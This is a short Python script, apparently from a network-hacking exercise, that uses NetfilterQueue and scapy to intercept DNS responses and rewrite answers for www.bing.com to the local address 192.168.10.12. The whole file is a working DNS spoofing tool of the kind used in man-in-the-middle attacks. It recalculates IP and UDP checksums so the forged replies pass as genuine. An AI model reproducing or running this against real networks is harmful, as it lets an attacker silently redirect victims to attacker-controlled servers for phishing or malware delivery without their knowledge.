#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        website = b"www.bing.com"
        if website in qname:

            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname,rdata="192.168.10.12")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
                
                
    packet.accept()
nfqueue = NetfilterQueue()
nfqueue.bind(0,process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
